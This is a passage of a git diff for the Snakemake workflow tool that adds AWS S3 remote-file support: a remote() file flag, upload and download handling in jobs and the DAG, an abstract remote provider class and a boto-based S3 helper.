lambda job_, f: any(\n+            f in files for j, files in self.depending[job_].items()\n+            if not self.finished(j) and self.needrun(j) and j != job)\n+\n+        remote_files = set([f for f in job.expanded_input if f.is_remote]) | set([f for f in job.expanded_output if f.is_remote])\n+        local_files = set([f for f in job.input if not f.is_remote]) | set([f for f in job.expanded_output if not f.is_remote])\n+        files_to_keep = set(f for f in remote_files if is_flagged(f, \"keep\"))\n+\n+        # remove local files from list of remote files\n+        # in case the same file is specified in both places\n+        remote_files -= local_files\n+        remote_files -= files_to_keep\n+\n+        def unneeded_files():\n+            for job_, files in self.dependencies[job].items():\n+                for f in (remote_files & files):\n+                    if not needed(job_, f) and not f.protected:\n+                        yield f\n+            for f in filterfalse(partial(needed, job), [f for f in remote_files]):\n+                if not f in self.targetfiles and not f.protected:\n+                    yield f\n+\n+        def expanded_dynamic_depending_input_files():\n+            for j in self.depending[job]:    \n+                for f in j.expanded_input:\n+                    yield f\n+\n+        unneededFiles = set(unneeded_files())\n+        unneededFiles -= set(expanded_dynamic_depending_input_files())\n+\n+        for f in [f for f in job.expanded_output if f.is_remote]:\n+            if not f.exists_remote:\n+                logger.info(\"Uploading local output file to remote: {}\".format(f))\n+                f.upload_to_remote()\n+\n+        for f in set(unneededFiles):\n+            logger.info(\"Removing local output file: {}\".format(f))\n+            f.remove()\n+\n+        job.rmdir_empty_remote_dirs()\n+\n+\n     def jobid(self, job):\n         if job not in self._jobid:\n             self._jobid[job] = len(self._jobid)\ndiff --git a/snakemake/decorators.py b/snakemake/decorators.py\nnew file mode 100644\nindex 0000000..063ddde\n--- /dev/null\n+++ b/snakemake/decorators.py\n@@ -0,0 +1,31 @@\n+__author__ = \"Christopher Tomkins-Tinch\"\n+__copyright__ = \"Copyright 2015, Christopher Tomkins-Tinch\"\n+__email__ = \"tomkinsc@broadinstitute.org\"\n+__license__ = \"MIT\"\n+\n+import functools\n+import inspect\n+\n+\n+def memoize(obj):\n+    cache = obj.cache = {}\n+\n+    @functools.wraps(obj)\n+    def memoizer(*args, **kwargs):\n+        key = str(args) + str(kwargs)\n+        if key not in cache:\n+            cache[key] = obj(*args, **kwargs)\n+        return cache[key]\n+\n+    return memoizer\n+\n+\n+def decAllMethods(decorator, prefix='test_'):\n+\n+    def decClass(cls):\n+        for name, m in inspect.getmembers(cls, inspect.isfunction):\n+            if prefix == None or name.startswith(prefix):\n+                setattr(cls, name, decorator(m))\n+        return cls\n+\n+    return decClass\ndiff --git a/snakemake/exceptions.py b/snakemake/exceptions.py\nindex d606c99..7440442 100644\n--- a/snakemake/exceptions.py\n+++ b/snakemake/exceptions.py\n@@ -281,6 +281,13 @@ class IOFileException(RuleException):\n     def __init__(self, msg, lineno=None, snakefile=None):\n         super().__init__(msg, lineno=lineno, snakefile=snakefile)\n \n+class RemoteFileException(RuleException):\n+    def __init__(self, msg, lineno=None, snakefile=None):\n+        super().__init__(msg, lineno=lineno, snakefile=snakefile)\n+\n+class S3FileException(RuleException):\n+    def __init__(self, msg, lineno=None, snakefile=None):\n+        super().__init__(msg, lineno=lineno, snakefile=snakefile)\n \n class ClusterJobException(RuleException):\n     def __init__(self, job, jobid, jobscript):\ndiff --git a/snakemake/executors.py b/snakemake/executors.py\nindex 6bd0114..961e7ba 100644\n--- a/snakemake/executors.py\n+++ b/snakemake/executors.py\n@@ -109,6 +109,7 @@ def print_job_error(self, job):\n     def finish_job(self, job):\n         self.dag.handle_touch(job)\n         self.dag.check_output(job, wait=self.latency_wait)\n+        self.dag.handle_remote(job)\n         self.dag.handle_protected(job)\n         self.dag.handle_temp(job)\n \ndiff --git a/snakemake/io.py b/snakemake/io.py\nindex 0ba9cbd..3e32628 100644\n--- a/snakemake/io.py\n+++ b/snakemake/io.py\n@@ -8,11 +8,12 @@\n import stat\n import time\n import json\n+import functools\n from itertools import product, chain\n from collections import Iterable, namedtuple\n-from snakemake.exceptions import MissingOutputException, WorkflowError, WildcardError\n+from snakemake.exceptions import MissingOutputException, WorkflowError, WildcardError, RemoteFileException, S3FileException\n from snakemake.logging import logger\n-\n+import snakemake.remote_providers.S3 as S3\n \n def lstat(f):\n     return os.stat(f, follow_symlinks=os.stat not in os.supports_follow_symlinks)\n@@ -45,9 +46,46 @@ def __new__(cls, file):\n         obj._file = file\n         obj.rule = None\n         obj._regex = None\n+\n         return obj\n \n+    def __init__(self, file):\n+        self._remote_object = None\n+        if self.is_remote:\n+            additional_args = get_flag_value(self._file, \"additional_remote_args\") if get_flag_value(self._file, \"additional_remote_args\") else []\n+            additional_kwargs = get_flag_value(self._file, \"additional_remote_kwargs\") if get_flag_value(self._file, \"additional_remote_kwargs\") else {}\n+            self._remote_object = get_flag_value(self._file, \"remote_provider\").RemoteObject(self, *additional_args, **additional_kwargs)\n+        pass\n+\n+    def _referToRemote(func):\n+        \"\"\" \n+            A decorator so that if the file is remote and has a version \n+            of the same file-related function, call that version instead. \n+        \"\"\"\n+        @functools.wraps(func)\n+        def wrapper(self, *args, **kwargs):\n+            if self.is_remote:\n+                if self.remote_object:\n+                    if hasattr( self.remote_object, func.__name__):\n+                        return getattr( self.remote_object, func.__name__)(*args, **kwargs)\n+            return func(self, *args, **kwargs)\n+        return wrapper\n+\n     @property\n+    def is_remote(self):\n+        return is_flagged(self._file, \"remote\")\n+    \n+    @property\n+    def remote_object(self):\n+        if not self._remote_object:\n+            if self.is_remote:\n+               additional_kwargs = get_flag_value(self._file, \"additional_remote_kwargs\") if get_flag_value(self._file, \"additional_remote_kwargs\") else {}\n+               self._remote_object = get_flag_value(self._file, \"remote_provider\").RemoteObject(self, **additional_kwargs)\n+        return self._remote_object\n+    \n+\n+    @property\n+    @_referToRemote\n     def file(self):\n         if not self._is_function:\n             return self._file\n@@ -56,32 +94,74 @@ def file(self):\n                              \"may not be used directly.\")\n \n     @property\n+    @_referToRemote\n     def exists(self):\n         return os.path.exists(self.file)\n \n     @property\n-    def protected(self):\n-        return self.exists and not os.access(self.file, os.W_OK)\n+    def exists_local(self):\n+        return os.path.exists(self.file)\n+\n+    @property\n+    def exists_remote(self):\n+        return (self.is_remote and self.remote_object.exists())\n+    \n \n     @property\n+    def protected(self):\n+        return self.exists_local and not os.access(self.file, os.W_OK)\n+    \n+    @property\n+    @_referToRemote\n     def mtime(self):\n+        return lstat(self.file).st_mtime\n+\n+    @property\n+    def flags(self):\n+        return getattr(self._file, \"flags\", {})\n+\n+    @property\n+    def mtime_local(self):\n         # do not follow symlinks for modification time\n         return lstat(self.file).st_mtime\n \n     @property\n+    @_referToRemote\n     def size(self):\n         # follow symlinks but throw error if invalid\n         self.check_broken_symlink()\n         return os.path.getsize(self.file)\n \n+    @property\n+    def size_local(self):\n+        # follow symlinks but throw error if invalid\n+        self.check_broken_symlink()\n+        return os.path.getsize(self.file)\n+\n     def check_broken_symlink(self):\n         \"\"\" Raise WorkflowError if file is a broken symlink. \"\"\"\n-        if not self.exists and lstat(self.file):\n+        if not self.exists_local and lstat(self.file):\n             raise WorkflowError(\"File {} seems to be a broken symlink.\".format(self.file))\n \n     def is_newer(self, time):\n         return self.mtime > time\n \n+    def download_from_remote(self):\n+        logger.info(\"Downloading from remote: {}\".format(self.file))\n+\n+        if self.is_remote and self.remote_object.exists():\n+            self.remote_object.download()\n+        else:\n+            raise RemoteFileException(\"The file to be downloaded does not seem to exist remotely.\")\n+ \n+    def upload_to_remote(self):\n+        logger.info(\"Uploading to remote: {}\".format(self.file))\n+\n+        if self.is_remote and not self.remote_object.exists():\n+            self.remote_object.upload()\n+        else:\n+            raise RemoteFileException(\"The file to be uploaded does not seem to exist remotely.\")\n+\n     def prepare(self):\n         path_until_wildcard = re.split(self.dynamic_fill, self.file)[0]\n         dir = os.path.dirname(path_until_wildcard)\n@@ -108,9 +188,10 @@ def protect(self):\n     def remove(self):\n         remove(self.file)\n \n-    def touch(self):\n+    def touch(self, times=None):\n+        \"\"\" times must be 2-tuple: (atime, mtime) \"\"\"\n         try:\n-            lutime(self.file, None)\n+            lutime(self.file, times)\n         except OSError as e:\n             if e.errno == 2:\n                 raise MissingOutputException(\n@@ -136,11 +217,21 @@ def apply_wildcards(self, wildcards,\n         if self._is_function:\n             f = self._file(Namedlist(fromdict=wildcards))\n \n-        return IOFile(apply_wildcards(f, wildcards,\n+        # this bit ensures flags are transferred over to files after\n+        # wildcards are applied\n+\n+        flagsBeforeWildcardResolution = getattr(f, \"flags\", {})\n+\n+\n+        fileWithWildcardsApplied = IOFile(apply_wildcards(f, wildcards,\n                                       fill_missing=fill_missing,\n                                       fail_dynamic=fail_dynamic,\n                                       dynamic_fill=self.dynamic_fill),\n-                      rule=self.rule)\n+                                      rule=self.rule)\n+\n+        fileWithWildcardsApplied.set_flags(getattr(f, \"flags\", {}))\n+\n+        return fileWithWildcardsApplied\n \n     def get_wildcard_names(self):\n         return get_wildcard_names(self.file)\n@@ -166,6 +257,17 @@ def match(self, target):\n     def format_dynamic(self):\n         return self.replace(self.dynamic_fill, \"{*}\")\n \n+    def clone_flags(self, other):\n+        if isinstance(self._file, str):\n+            self._file = AnnotatedString(self._file)\n+        if isinstance(other._file, AnnotatedString):\n+            self._file.flags = getattr(other._file, \"flags\", {})\n+\n+    def set_flags(self, flags):\n+        if isinstance(self._file, str):\n+            self._file = AnnotatedString(self._file)\n+        self._file.flags = flags\n+\n     def __eq__(self, other):\n         f = other._file if isinstance(other, _IOFile) else other\n         return self._file == f\n@@ -286,9 +388,17 @@ def flag(value, flag_type, flag_value=True):\n \n def is_flagged(value, flag):\n     if isinstance(value, AnnotatedString):\n-        return flag in value.flags\n+        return flag in value.flags and value.flags[flag]\n+    if isinstance(value, _IOFile):\n+        return flag in value.flags and value.flags[flag]\n     return False\n \n+def get_flag_value(value, flag_type):\n+    if isinstance(value, AnnotatedString):\n+        if flag_type in value.flags:\n+            return value.flags[flag_type]\n+        else:\n+            return None\n \n def temp(value):\n     \"\"\"\n@@ -297,6 +407,9 @@ def temp(value):\n     if is_flagged(value, \"protected\"):\n         raise SyntaxError(\n             \"Protected and temporary flags are mutually exclusive.\")\n+    if is_flagged(value, \"remote\"):\n+        raise SyntaxError(\n+            \"Remote and temporary flags are mutually exclusive.\")\n     return flag(value, \"temp\")\n \n \n@@ -310,6 +423,9 @@ def protected(value):\n     if is_flagged(value, \"temp\"):\n         raise SyntaxError(\n             \"Protected and temporary flags are mutually exclusive.\")\n+    if is_flagged(value, \"remote\"):\n+        raise SyntaxError(\n+            \"Remote and protected flags are mutually exclusive.\")\n     return flag(value, \"protected\")\n \n \n@@ -318,7 +434,7 @@ def dynamic(value):\n     A flag for a file that shall be dynamic, i.e. the multiplicity\n     (and wildcard values) will be expanded after a certain\n     rule has been run \"\"\"\n-    annotated = flag(value, \"dynamic\")\n+    annotated = flag(value, \"dynamic\", True)\n     tocheck = [annotated] if not_iterable(annotated) else annotated\n     for file in tocheck:\n         matches = list(_wildcard_regex.finditer(file))\n@@ -334,6 +450,36 @@ def dynamic(value):\n def touch(value):\n     return flag(value, \"touch\")\n \n+def remote(value, provider=S3, keep=False, additional_args=None, additional_kwargs=None):\n+\n+    additional_args = [] if not additional_args else additional_args\n+    additional_kwargs = {} if not additional_kwargs else additional_kwargs\n+\n+    if not provider:\n+        raise RemoteFileException(\"Provider (S3, etc.) must be specified for remote file as kwarg.\")\n+    if is_flagged(value, \"temp\"):\n+        raise SyntaxError(\n+            \"Remote and temporary flags are mutually exclusive.\")\n+    if is_flagged(value, \"protected\"):\n+        raise SyntaxError(\n+            \"Remote and protected flags are mutually exclusive.\")\n+    return flag(\n+                flag(\n+                    flag( \n+                        flag( \n+                            flag(value, \"remote\"), \n+                            \"remote_provider\", \n+                            provider\n+                        ), \n+                        \"additional_remote_kwargs\", \n+                        additional_kwargs\n+                    ),\n+                    \"additional_remote_args\",\n+                    additional_args\n+                ),\n+                \"keep\",\n+                keep\n+            )\n \n def expand(*args, **wildcards):\n     \"\"\"\n@@ -410,6 +556,31 @@ def glob_wildcards(pattern):\n                     getattr(wildcards, name).append(value)\n     return wildcards\n \n+def glob_wildcards_remote(pattern, provider=S3, additional_kwargs=None):\n+    additional_kwargs = additional_kwargs if additional_kwargs else {}\n+    referenceObj = IOFile(remote(pattern, provider=provider, **additional_kwargs))\n+    key_list = [k.name for k in referenceObj._remote_object.list] \n+\n+    pattern = \"./\"+ referenceObj._remote_object.name\n+    pattern = os.path.normpath(pattern)\n+    first_wildcard = re.search(\"{[^{]\", pattern)\n+    dirname = os.path.dirname(pattern[:first_wildcard.start(\n+    )]) if first_wildcard else os.path.dirname(pattern)\n+    if not dirname:\n+        dirname = \".\"\n+\n+    names = [match.group('name')\n+             for match in _wildcard_regex.finditer(pattern)]\n+    Wildcards = namedtuple(\"Wildcards\", names)\n+    wildcards = Wildcards(*[list() for name in names])\n+\n+    pattern = re.compile(regex(pattern))\n+    for f in key_list:\n+        match = re.match(pattern, f)\n+        if match:\n+            for name, value in match.groupdict().items():\n+                getattr(wildcards, name).append(value)\n+    return wildcards\n \n # TODO rewrite Namedlist!\n class Namedlist(list):\ndiff --git a/snakemake/jobs.py b/snakemake/jobs.py\nindex fdba8b5..317c7c4 100644\n--- a/snakemake/jobs.py\n+++ b/snakemake/jobs.py\n@@ -13,7 +13,7 @@\n from functools import partial\n from operator import attrgetter\n \n-from snakemake.io import IOFile, Wildcards, Resources, _IOFile\n+from snakemake.io import IOFile, Wildcards, Resources, _IOFile, is_flagged, contains_wildcard\n from snakemake.utils import format, listfiles\n from snakemake.exceptions import RuleException, ProtectedOutputException\n from snakemake.exceptions import UnexpectedOutputException\n@@ -131,7 +131,40 @@ def expanded_output(self):\n                 if not expansion:\n                     yield f_\n                 for f, _ in expansion:\n-                    yield IOFile(f, self.rule)\n+                    fileToYield = IOFile(f, self.rule)\n+\n+                    fileToYield.clone_flags(f_)\n+\n+                    yield fileToYield\n+            else:\n+                yield f\n+\n+    @property\n+    def expanded_input(self):\n+        \"\"\" Iterate over input files while dynamic output is expanded. \"\"\"\n+\n+        for f, f_ in zip(self.input, self.rule.input):\n+            if not type(f_).__name__ == \"function\":\n+                if type(f_.file).__name__ not in [\"str\", \"function\"]:\n+                    if contains_wildcard(f_):\n+\n+                        expansion = self.expand_dynamic(\n+                            f_,\n+                            restriction=self.wildcards,\n+                            omit_value=_IOFile.dynamic_fill)\n+                        if not expansion:\n+                            yield f_\n+                        for f, _ in expansion:\n+\n+                            fileToYield = IOFile(f, self.rule)\n+\n+                            fileToYield.clone_flags(f_)\n+\n+                            yield fileToYield\n+                    else:\n+                        yield f\n+                else:\n+                    yield f\n             else:\n                 yield f\n \n@@ -159,6 +192,34 @@ def missing_input(self):\n         return set(f for f in self.input\n                    if not f.exists and not f in self.subworkflow_input)\n \n+\n+    @property\n+    def present_remote_input(self):\n+        files = set()\n+\n+        for f in self.input:\n+            if f.is_remote:\n+                if f.exists_remote:\n+                    files.add(f)\n+        return files\n+    \n+    @property\n+    def present_remote_output(self):\n+        files = set()\n+\n+        for f in self.remote_output:\n+            if f.exists_remote:\n+                files.add(f)\n+        return files\n+\n+    @property\n+    def missing_remote_input(self):\n+        return self.remote_input - self.present_remote_input\n+\n+    @property\n+    def missing_remote_output(self):\n+        return self.remote_output - self.present_remote_output\n+\n     @property\n     def output_mintime(self):\n         \"\"\" Return oldest output file. \"\"\"\n@@ -197,6 +258,74 @@ def missing_output(self, requested=None):\n                     files.add(f)\n         return files\n \n+\n+    @property\n+    def remote_input(self):\n+        for f in self.input:\n+            if f.is_remote:\n+                yield f\n+\n+    @property\n+    def remote_output(self):\n+        for f in self.output:\n+            if f.is_remote:\n+                yield f\n+\n+    @property\n+    def remote_input_newer_than_local(self):\n+        files = set()\n+        for f in self.remote_input:\n+            if (f.exists_remote and f.exists_local) and (f.mtime > f.mtime_local):\n+                files.add(f)\n+        return files\n+\n+    @property\n+    def remote_input_older_than_local(self):\n+        files = set()\n+        for f in self.remote_input:\n+            if (f.exists_remote and f.exists_local) and (f.mtime < f.mtime_local):\n+                files.add(f)\n+        return files\n+\n+    @property\n+    def remote_output_newer_than_local(self):\n+        files = set()\n+        for f in self.remote_output:\n+            if (f.exists_remote and f.exists_local) and (f.mtime > f.mtime_local):\n+                files.add(f)\n+        return files\n+\n+    @property\n+    def remote_output_older_than_local(self):\n+        files = set()\n+        for f in self.remote_output:\n+            if (f.exists_remote and f.exists_local) and (f.mtime < f.mtime_local):\n+                files.add(f)\n+        return files\n+\n+    def transfer_updated_files(self):\n+        for f in self.remote_output_older_than_local | self.remote_input_older_than_local:\n+            f.upload_to_remote()\n+\n+        for f in self.remote_output_newer_than_local | self.remote_input_newer_than_local:\n+            f.download_from_remote()\n+    \n+    @property\n+    def files_to_download(self):\n+        toDownload = set()\n+\n+        for f in self.input:\n+            if f.is_remote:\n+                if not f.exists_local and f.exists_remote:\n+                    toDownload.add(f)\n+\n+        toDownload = toDownload | self.remote_input_newer_than_local\n+        return toDownload\n+\n+    @property\n+    def files_to_upload(self):\n+        return self.missing_remote_input & self.remote_input_older_than_local\n+\n     @property\n     def existing_output(self):\n         return filter(lambda f: f.exists, self.expanded_output)\n@@ -231,6 +360,10 @@ def prepare(self):\n                 os.remove(f)\n         for f, f_ in zip(self.output, self.rule.output):\n             f.prepare()\n+\n+        for f in self.files_to_download:\n+            f.download_from_remote()\n+\n         for f in self.log:\n             f.prepare()\n         if self.benchmark:\n@@ -239,6 +372,8 @@ def prepare(self):\n     def cleanup(self):\n         \"\"\" Cleanup output files. \"\"\"\n         to_remove = [f for f in self.expanded_output if f.exists]\n+\n+        to_remove.extend([f for f in self.remote_input if f.exists])\n         if to_remove:\n             logger.info(\"Removing output files of failed job {}\"\n                         \" since they might be corrupted:\\n{}\".format(\n@@ -246,6 +381,23 @@ def cleanup(self):\n             for f in to_remove:\n                 f.remove()\n \n+            self.rmdir_empty_remote_dirs()\n+\n+    @property\n+    def empty_remote_dirs(self):\n+        remote_files = [f for f in (set(self.output) | set(self.input)) if f.is_remote]\n+        emptyDirsToRemove = set(os.path.dirname(f) for f in remote_files if not len(os.listdir(os.path.dirname(f))))\n+        return emptyDirsToRemove\n+\n+    def rmdir_empty_remote_dirs(self):\n+        for d in self.empty_remote_dirs:\n+            pathToDel = d\n+            while len(pathToDel) > 0 and len(os.listdir(pathToDel)) == 0:\n+                logger.info(\"rmdir empty dir: {}\".format(pathToDel))\n+                os.rmdir(pathToDel)\n+                pathToDel = os.path.dirname(pathToDel)\n+\n+\n     def format_wildcards(self, string, **variables):\n         \"\"\" Format a string with variables from the job. \"\"\"\n         _variables = dict()\ndiff --git a/snakemake/remote_providers/RemoteObjectProvider.py b/snakemake/remote_providers/RemoteObjectProvider.py\nnew file mode 100644\nindex 0000000..b040e87\n--- /dev/null\n+++ b/snakemake/remote_providers/RemoteObjectProvider.py\n@@ -0,0 +1,50 @@\n+__author__ = \"Christopher Tomkins-Tinch\"\n+__copyright__ = \"Copyright 2015, Christopher Tomkins-Tinch\"\n+__email__ = \"tomkinsc@broadinstitute.org\"\n+__license__ = \"MIT\"\n+\n+from abc import ABCMeta, abstractmethod\n+\n+\n+class RemoteObject:\n+    \"\"\" This is an abstract class to be used to derive remote object classes for \n+        different cloud storage providers. For example, there could be classes for interacting with \n+        Amazon AWS S3 and Google Cloud Storage, both derived from this common base class.\n+    \"\"\"\n+    __metaclass__ = ABCMeta\n+\n+    def __init__(self, ioFile):\n+        self._iofile = ioFile\n+        self._file = ioFile._file\n+\n+    @abstractmethod\n+    def file(self):\n+        pass\n+\n+    @abstractmethod\n+    def exists(self):\n+        pass\n+\n+    @abstractmethod\n+    def mtime(self):\n+        pass\n+\n+    @abstractmethod\n+    def size(self):\n+        pass\n+\n+    @abstractmethod\n+    def download(self, *args, **kwargs):\n+        pass\n+\n+    @abstractmethod\n+    def upload(self, *args, **kwargs):\n+        pass\n+\n+    @abstractmethod\n+    def list(self, *args, **kwargs):\n+        pass\n+\n+    @abstractmethod\n+    def name(self, *args, **kwargs):\n+        pass\ndiff --git a/snakemake/remote_providers/S3.py b/snakemake/remote_providers/S3.py\nnew file mode 100644\nindex 0000000..77b15ea\n--- /dev/null\n+++ b/snakemake/remote_providers/S3.py\n@@ -0,0 +1,90 @@\n+__author__ = \"Christopher Tomkins-Tinch\"\n+__copyright__ = \"Copyright 2015, Christopher Tomkins-Tinch\"\n+__email__ = \"tomkinsc@broadinstitute.org\"\n+__license__ = \"MIT\"\n+\n+import re\n+\n+from snakemake.remote_providers.RemoteObjectProvider import RemoteObject\n+from snakemake.exceptions import MissingOutputException, WorkflowError, WildcardError, RemoteFileException, S3FileException\n+from snakemake.remote_providers.implementations.S3 import S3Helper\n+from snakemake.decorators import memoize\n+\n+import boto\n+\n+\n+class RemoteObject(RemoteObject):\n+    \"\"\" This is a class to interact with the AWS S3 object store.\n+    \"\"\"\n+\n+    def __init__(self, *args, **kwargs):\n+        super(RemoteObject, self).__init__(*args, **kwargs)\n+\n+        # pass all args but the first, which is the ioFile\n+        self._s3c = S3Helper(*args[1:], **kwargs)\n+\n+    # === Implementations of abstract class members ===\n+\n+    def file(self):\n+        return self._file\n+\n+    def exists(self):\n+        if self._matched_s3_path:\n+            return self._s3c.exists_in_bucket(self.s3_bucket, self.s3_key)\n+        else:\n+            raise S3FileException(\"The file cannot be parsed as an s3 path in form 'bucket/key': %s\" % self.file())\n+\n+    def mtime(self):\n+        if self.exists():\n+            return self._s3c.key_last_modified(self.s3_bucket, self.s3_key)\n+        else:\n+            raise S3FileException(\"The file does not seem to exist remotely: %s\" % self.file())\n+\n+    def size(self):\n+        if self.exists():\n+            return self._s3c.key_size(self.s3_bucket, self.s3_key)\n+        else:\n+            return self._iofile.size_local\n+\n+    def download(self):\n+        self._s3c.download_from_s3(self.s3_bucket, self.s3_key, self.file())\n+\n+    def upload(self):\n+        conn = boto.connect_s3()\n+        if self.size() > 5000:\n+            self._s3c.upload_to_s3_multipart(self.s3_bucket, self.file(), self.s3_key)\n+        else:\n+            self._s3c.upload_to_s3(self.s3_bucket, self.file(), self.s3_key)\n+\n+    @property\n+    def list(self):\n+        return self._s3c.list_keys(self.s3_bucket)\n+\n+    # === Related methods ===\n+\n+    @property\n+    def _matched_s3_path(self):\n+        return re.search(\"(?P<bucket>[^/]*)/(?P<key>.*)\", self.file())\n+\n+    @property\n+    def s3_bucket(self):\n+        if len(self._matched_s3_path.groups()) == 2:\n+            return self._matched_s3_path.group(\"bucket\")\n+        return None\n+\n+    @property\n+    def name(self):\n+        return self.s3_key\n+\n+    @property\n+    def s3_key(self):\n+        if len(self._matched_s3_path.groups()) == 2:\n+            return self._matched_s3_path.group(\"key\")\n+\n+    def s3_create_stub(self):\n+        if self._matched_s3_path:\n+            if not self.exists:\n+                self._s3c.download_from_s3(self.s3_bucket, self.s3_key, self.file, createStubOnly=True)\n+        else:\n+            raise S3FileException(\"The file to be downloaded cannot be parsed as an s3 path in form 'bucket/key': %s\" %\n+                                  self.file())\ndiff --git a/snakemake/remote_providers/__init__.py b/snakemake/remote_providers/__init__.py\nnew file mode 100644\nindex 0000000..8b13789\n--- /dev/null\n+++ b/snakemake/remote_providers/__init__.py\n@@ -0,0 +1 @@\n+\ndiff --git a/snakemake/remote_providers/implementations/S3.py b/snakemake/remote_providers/implementations/S3.py\nnew file mode 100644\nindex 0000000..c6cb622\n--- /dev/null\n+++ b/snakemake/remote_providers/implementations/S3.py\n@@ -0,0 +1,341 @@\n+__author__ = \"Christopher Tomkins-Tinch\"\n+__copyright__ = \"Copyright 2015, Christopher Tomkins-Tinch\"\n+__email__ = \"tomkinsc@broadinstitute.org\"\n+__license__ = \"MIT\"\n+\n+# built-ins\n+import os\n+import math\n+import time\n+import email.utils\n+from time import mktime\n+import datetime\n+from multiprocessing import Pool\n+\n+# third-party modules\n+import boto\n+from boto.s3.key import Key\n+from filechunkio import FileChunkIO\n+\n+\n+class S3Helper(object):\n+\n+    def __init__(self, *args, **kwargs):\n+        # as per boto, expects the environment variables to be set:\n+        # AWS_ACCESS_KEY_ID\n+        # AWS_SECRET_ACCESS_KEY\n+        # Otherwise these values need to be passed in as kwargs\n+        self.conn = boto.connect_s3(*args, **kwargs)\n+\n+    def upload_to_s3(\n+            self,\n+            bucketName,\n+            filePath,\n+            key=None,\n+            useRelativePathForKey=True,\n+            relativeStartDir=None,\n+            replace=False,\n+            reduced_redundancy=False,\n+            headers=None):\n+        \"\"\" Upload a file to S3\n+\n+            This function uploads a file to an AWS S3 bucket.\n+\n+            Args:\n+                bucketName: the name of the S3 bucket to use (bucket name only, not ARN)\n+                filePath: The path to the file to upload.\n+                key: The key to set for the file on S3. If not specified, this will default to the\n+                    name of the file.\n+                useRelativePathForKey: If set to True (default), and key is None, the S3 key will include slashes\n+                    representing the path of the file relative to the CWD. If False only the\n+                    file basename will be used for the key.\n+                relativeStartDir: The start dir to use for useRelativePathForKey. No effect if key is set.\n+                replace: If True a file with the same key will be replaced with the one being written\n+                reduced_redundancy: Sets the file to AWS reduced redundancy storage.\n+                headers: additional heads to pass to AWS\n+\n+            Returns: The key of the file on S3 if written, None otherwise\n+        \"\"\"\n+        filePath = os.path.realpath(os.path.expanduser(filePath))\n+\n+        assert bucketName, \"bucketName must be specified\"\n+        assert os.path.exists(filePath), \"The file path specified does not exist: %s\" % filePath\n+        assert os.path.isfile(filePath), \"The file path specified does not appear to be a file: %s\" % filePath\n+\n+        try:\n+            b = self.conn.get_bucket(bucketName)\n+        except:\n+            b = self.conn.create_bucket(bucketName)\n+\n+        k = Key(b)\n+\n+        if key:\n+            k.key = key\n+        else:\n+            if useRelativePathForKey:\n+                if relativeStartDir:\n+                    pathKey = os.path.relpath(filePath, relativeStartDir)\n+                else:\n+                    pathKey = os.path.relpath(filePath)\n+            else:\n+                pathKey = os.path.basename(filePath)\n+            k.key = pathKey\n+        try:\n+            bytesWritten = k.set_contents_from_filename(\n+                filePath,\n+                replace=replace,\n+                reduced_redundancy=reduced_redundancy,\n+                headers=headers)\n+            if bytesWritten:\n+                return k.key\n+            else:\n+                return None\n+        except:\n+            return None\n+\n+    def download_from_s3(\n+            self,\n+            bucketName,\n+            key,\n+            destinationPath=None,\n+            expandKeyIntoDirs=True,\n+            makeDestDirs=True,\n+            headers=None, createStubOnly=False):\n+        \"\"\" Download a file from s3\n+\n+            This function downloads an object from a specified AWS S3 bucket.\n+\n+            Args:\n+                bucketName: the name of the S3 bucket to use (bucket name only, not ARN)\n+                destinationPath: If specified, the file will be saved to this path, otherwise cwd.\n+                expandKeyIntoDirs: Since S3 keys can include slashes, if this is True (defult)\n+                    then S3 keys with slashes are expanded into directories on the receiving end.\n+                    If it is False, the key is passed to os.path.basename() to get the substring\n+                    following the last slash.\n+                makeDestDirs: If this is True (default) and the destination path includes directories\n+                    that do not exist, they will be created.\n+                headers: Additional headers to pass to AWS\n+\n+            Returns:\n+                The destination path of the downloaded file on the receiving end, or None if the filePath\n+                could not be downloaded\n+        \"\"\"\n+        assert bucketName, \"bucketName must be specified\"\n+        assert key, \"Key must be specified\"\n+\n+        b = self.conn.get_bucket(bucketName)\n+        k = Key(b)\n+\n+        if destinationPath:\n+            destinationPath = os.path.realpath(os.path.expanduser(destinationPath))\n+        else:\n+            if expandKeyIntoDirs:\n+                destinationPath = os.path.join(os.getcwd(), key)\n+            else:\n+                destinationPath = os.path.join(os.getcwd(), os.path.basename(key))\n+\n+        # if the destination path does not exist\n+        if not os.path.exists(os.path.dirname(destinationPath)) and makeDestDirs:\n+            os.makedirs(os.path.dirname(destinationPath))\n+\n+        k.key = key if key else os.path.basename(filePath)\n+\n+        try:\n+            if not createStubOnly:\n+                k.get_contents_to_filename(destinationPath, headers=headers)\n+            else:\n+                # just create an empty file with the right timestamps\n+                with open(destinationPath, 'wb') as fp:\n+                    modified_tuple = email.utils.parsedate_tz(k.last_modified)\n+                    modified_stamp = int(email.utils.mktime_tz(modified_tuple))\n+                    os.utime(fp.name, (modified_stamp, modified_stamp))\n+            return destinationPath\n+        except:\n+            return None\n+\n+    def _upload_part(self, bucketName, multipart_id, part_num, source_path, offset, bytesToWrite, numberOfRetries=5):\n+\n+        def _upload(retriesRemaining=numberOfRetries):\n+            try:\n+                b = self.conn.get_bucket(bucketName)\n+                for mp in b.get_all_multipart_uploads():\n+                    if mp.id == multipart_id:\n+                        with FileChunkIO(source_path, 'r', offset=offset, bytes=bytesToWrite) as fp:\n+                            mp.upload_part_from_file(fp=fp, part_num=part_num)\n+                        break\n+            except Exception() as e:\n+                if retriesRemaining:\n+                    _upload(retriesRemaining=retriesRemaining - 1)\n+                else:\n+                    raise e\n+\n+        _upload()\n+\n+    def upload_to_s3_multipart(\n+            self,\n+            bucketName,\n+            filePath,\n+            key=None,\n+            useRelativePathForKey=True,\n+            relativeStartDir=None,\n+            replace=False,\n+            reduced_redundancy=False,\n+            headers=None,\n+            parallel_processes=4):\n+        \"\"\" Upload a file to S3\n+\n+            This function uploads a file to an AWS S3 bucket.\n+\n+            Args:\n+                bucketName: the name of the S3 bucket to use (bucket name only, not ARN)\n+                filePath: The path to the file to upload.\n+                key: The key to set for the file on S3. If not specified, this will default to the\n+                    name of the file.\n+                useRelativePathForKey: If set to True (default), and key is None, the S3 key will include slashes\n+                    representing the path of the file relative to the CWD. If False only the\n+                    file basename will be used for the key.\n+                relativeStartDir: The start dir to use for useRelativePathForKey. No effect if key is set.\n+                replace: If True a file with the same key will be replaced with the one being written\n+                reduced_redundancy: Sets the file to AWS reduced redundancy storage.\n+                headers: additional heads to pass to AWS\n+                parallel_processes: Number of concurrent uploads\n+\n+            Returns: The key of the file on S3 if written, None otherwise\n+        \"\"\"\n+        filePath = os.path.realpath(os.path.expanduser(filePath))\n+\n+        assert bucketName, \"bucketName must be specified\"\n+        assert 